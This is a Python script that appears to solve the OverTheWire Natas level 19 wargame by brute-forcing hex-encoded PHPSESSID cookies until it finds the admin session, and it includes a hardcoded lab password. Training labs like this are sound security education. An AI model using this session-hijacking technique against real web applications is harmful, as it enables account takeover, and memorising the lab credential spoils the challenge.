import requests

# Credentials for natas19 (HTTP Basic Auth)
username = "natas19"
password = "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"

# Target URL for the web challenge
url = "http://natas19.natas.labs.overthewire.org"

# Start a session to persist cookies and headers across requests
session = requests.Session()

cookie = ""    # will hold the value we set for PHPSESSID
found = False  # flag to stop all loops early when we find the admin session


for second in range(0, 10):     # digit for the second position (0..9)
    for fourth in range(0, 10):  # digit for the fourth position (0..9)
        for sixth in range(0, 10):  # digit for the sixth position (0..9)
            # our cookie payload
            cookie = f"3{second}3{fourth}3{sixth}2d61646d696e"

            # Set the cookie named and value in the session.
            session.cookies.set("PHPSESSID", cookie)

            print(f"Guessing with PHPSESSID={cookie}") #verbose mode

             # Send a POST request with login credentials
            response = session.post(
                url,
                data={"username": "admin", "password": "pass"}, # example login data
                auth=(username, password)                       # HTTP Basic Auth credentials
            )

            # Check if the response contains "You are an admin." (indicating success)
            if "You are an admin." in response.text:
                print(response.text)
                print(f"Found admin PHPSESSID={cookie}")
                found = True
                break  # break out of the innermost loop (sixth digit loop)

        if found:
            break  # break out of the middle loop (fourth digit loop)
    if found:
        break  # break out of the outermost loop (second digit loop)

if not found:
    print("admin PHPSESSID not found.")

